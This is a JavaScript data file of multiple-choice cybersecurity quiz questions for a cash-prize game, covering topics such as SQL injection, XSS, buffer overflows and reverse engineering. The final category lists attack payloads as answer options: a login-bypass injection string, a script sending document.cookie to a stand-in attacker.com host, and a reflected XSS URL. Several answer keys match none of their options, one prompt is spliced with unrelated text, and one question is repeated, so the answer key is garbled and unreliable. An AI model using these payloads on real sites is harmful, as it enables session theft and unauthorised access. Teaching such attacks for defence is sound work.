const questions = [
  /* Category 1 Questions */
  {
    prompt: 'What is a tool in Cloud Security?',
    options: ['Malwarebytes', 'Firewalls', 'Cloudflare', 'WiFi'],
    correctAnswer: 'Hyper Text Markup Language',
    cashPrize: 10
  },
  {
    prompt: 'What is a tool in Application Security?',
    options: ['Sentinel One', 'Verizon', 'Honey Pot', 'Firewalls'],
    correctAnswer: 'Sentinel One',
    cashPrize: 50
  },
  {
    prompt: 'What is an important element to Network Security?',
    options: ['Installing Games', 'Network Segmentation', 'Operating WebCams', 'Running AntiVirus on PC'],
    correctAnswer: 'Network Segmentation',
    cashPrize: 100
  },
  {
    prompt: 'Which is an example of an Internet of Things (IoT) device?',
    options: ['Firewall', 'Regular TV', 'WiFi Router', 'Amazon Alexa'],
    correctAnswer: 'Amazon Alexa',
    cashPrize: 500
  },
  {
    prompt: 'What is an important component to protect in Critical Infrastructure Security?',
    options: ['WiFi Router', 'Users PC', 'Server with Root CAs', 'Headphones'],
    correctAnswer: 'Server with Root CAs',
    cashPrize: 1000
  },
  /* Category 2 Questions */
  {
    prompt: 'What is a buffer overflow?',
    options: ['data exceeding storage capacity of deep storage', 'data exceeding storage capacity of memory buffer', 'data added to storage capacity of memory buffer', 'data within storage capacity of memory buffer'],
    correctAnswer: 'data exceeding storage capacity of memory buffer',
    cashPrize: 10
  },
  {
    prompt: 'What is an SQL Injection?',
    options: ['SQL Injection is performing SQL statements', 'SQL Injection is the placement of positive code in SQL statements', 'SQL Injection is the placement of malicious code in SQL statements', 'SQL Injection is the Injecting of SQL'],
    correctAnswer: 'SQL Injection is the placement of malicious code in SQL statements',
    cashPrize: 50
  },
  {
    prompt: 'What is Cross Site Scripting (XSS)?',
    options: ['Injection of malicous executable scripts into code of an application/website', 'Injection of malicous executable scripts at a users PC', 'Injection of positive executable scripts into code of an application/website', 'Executable scripts in a fridge'],
    correctAnswer: 'Injection of malicous executable scripts into code of an application/website',
    cashPrize: 100
  },
  {
    prompt: 'What is Reflected Cross Site Scripting (XSS)?',
    options: ['Positive script that is reflected off of a web application to the victims browser', 'Malicious script that is injected into a web application in the victims browser', 'The sun reflected off of a web application to the victims browser', 'Malicious script that is reflected off of a web application to the victims browser'],
    correctAnswer: 'Malicious script that is reflected off of a web application to the victims browser',
    cashPrize: 500
  },
  {
    prompt: 'What is a file upload vulnerability',
    options: ['Users uploading animal pictures to a filesystem', 'Web server that allows users to upload files without sufficiently validating them', 'Web server that allows users to upload files with validation', 'Web server that allows users to download verified files'],
    correctAnswer: 'Web server that allows users to upload files without sufficiently validating them',
    cashPrize: 1000
  },
  /* Category 3 Questions */
  {
    prompt: 'What is binary explotation?',
    options: ['Using a vulnerability in order to cause intended or anticipated behaviour in a program', 'Adding a 2 to a series of 0/1\'s', 'Using a vulnerability in order to cause unintended or unanticipated behaviour in a program', 'Using a vulnerability in order to report it to the owner'],
    correctAnswer: 'Using a vulnerability in order to cause unintended or unanticipated behaviour in a program',
    cashPrize: 10
  },
  {
    prompt: 'Which of these helps in preventing attackers from executing custom shell code?',
    options: ['Using For Loops', 'Being told not to do it', 'Creating an SQL Injection', 'NX Bit'],
    correctAnswer: 'NX Bit',
    cashPrize: 50
  },
  {
    prompt: 'What is important to prevent an attacker from utilizing reverse engineering?',
    options: ['Secure the source code of the application', 'Secure user\'s passwords', 'Don\'t ever host your website', 'Don\'t use a CDN'],
    correctAnswer: 'Secure the source code of the application',
    cashPrize: 100
  },
  {
    prompt: 'What service helps in making data hard to access via randomization?',
    options: ['Random Function in C', 'Address Space Layout Randomization', 'Rolling a pair of dice when pushing code', 'A function written to randomize the output from a given input'],
    correctAnswer: 'Address Space Layout Randomization',
    cashPrize: 500
  },
  {
    prompt: 'Which of these helps in preventing "Stack Smashing"?',
    options: ['Saving a backup of the stack', 'Reading data on the stack', 'Popping off the stack', 'Stack Canaries'],
    correctAnswer: 'Yes, by default',
    cashPrize: 1000
  },
  /* Category 4 Questions */
  {
    prompt: 'What is reverse engineering?',
    options: ['Creating a piece of software with vulnerabilites instead of being a secured piece of software', 'Coding a piece of software backwards', 'Taking a piece of software or hardware and analyzing its functions and information flow so that its functionality and behavior can be misunderstood', 'Taking a piece of software or hardware and analyzing its functions and information flow so that its functionality and behavior can be understood'],
    correctAnswer: 'Taking a piece of software or hardware and analyzing its functions and information flow so that its functionality and behavior can be understood',
    cashPrize: 10
  },
  {
    prompt: 'What is an important element to reverse engineering in Cyber Security?',
    options: ['Configuring a firewall', 'Malware Analysis', 'Creating an SQL Injection', 'Setting up your WiFi Router'],
    correctAnswer: 'Malware Analysis',
    cashPrize: 50
  },
  {
    prompt: 'What is important to prevent an attacker from utilizing reverse engineering?',
    options: ['Secure the source code of the application', 'Secure user\'s passwords', 'Don\'t ever host your website', 'Don\'t use a CDN'],
    correctAnswer: 'Secure the source code of the application',
    cashPrize: 100
  },
  {
    prompt: 'Why could reverse engineering be considered "unethical"?',
    options: ['A user could fix further issues that weren\'t known previously', 'A user learns the in/outs of an application', 'A user could creat a malware clone and distribute it', 'A user reverse engineers unethically'],
    correctAnswer: 'A user could creat a malware clone and distribute it',
    cashPrize: 500
  },
  {
    prompt: 'What is the final step in aquiring the machine code for reverse engineering malware?',
    options: ['Aquiring a Hex Dump of the code', 'Retrieving the high level language of the malware\'s code', 'Aquiring the assembly code of the malware', 'Aquiring the brainstoring documents for the malware'],
    correctAnswer: 'Quickly search files for specific items of text',
    cashPrize: 1000
  },
  /* Category 5 Questions */
  {
    prompt: 'UA website uses this sql query for user authentication. How can an attacker bypass the loging system? SELECT * FROM users WHERE username=\'admin\' AND password=?se of "Alert" popup windows is often considered bad practice as browsers and users are hostile to pop-ups. What are the other two native Javascript popup functions?',
    options: ['\' OR \'1\'=\'1\'', '\' AND \'1\'=\'1\'', '\' IF \'1\'=\'1\'', '\' ELSE \'1\'=\'1\''],
    correctAnswer: '\' OR \'1\'=\'1\'',
    cashPrize: 10
  },
  {
    prompt: 'A website has a comment section where users can post comments about the products. How can an attacker get the web site visitor\'s cookies?',
    options: ['window.location = "http://attack.com/steal_cookies.php?cookie=" + document.cookie;', 'window.location = "http://attacker.com/steal_cookies.php?cookie="', 'window.location = "http://attacker.com/steal_cookies.php?cookie=" + document.cookie;', 'window.location = document.cookie;'],
    correctAnswer: 'window.location = "http://attacker.com/steal_cookies.php?cookie=" + document.cookie;',
    cashPrize: 50
  },
  {
    prompt: 'Suppose there is a website that has a search feature to search for products. How can an attacker use reflected cross-site scripting (XSS) to attack a victim?',
    options: ['https://example.com/search?q=alert(\'XSS\')', 'https://example.com/search?q=<script>alert(\'XSS\')</script>', '<script>alert(\'XSS\')</script>', 'https://example.com/search?q=<script>\'XSS\'</script>'],
    correctAnswer: 'https://example.com/search?q=<script>alert(\'XSS\')</script>',
    cashPrize: 100
  },
  {
    prompt: 'Suppose there is a website that allows users to upload files. Which option could cause a vulnerability?',
    options: ['malicious.jpg.php', 'malicous.jpg.png', 'malicous.jpg', 'malicous.jpg.example'],
    correctAnswer: 'malicious.jpg.php',
    cashPrize: 500
  },
  {
    prompt: 'Suppose there is a program that takes a user\'s name as input and stores it in a buffer. How can an attacker exploit this program if the buffer is size 10?',
    options: ['CCCCC', 'BBB', 'DDDDDDDDD', 'AAAAAAAAAAA'],
    correctAnswer: 'AAAAAAAAAAA',
    cashPrize: 1000
  }
];

export default questions;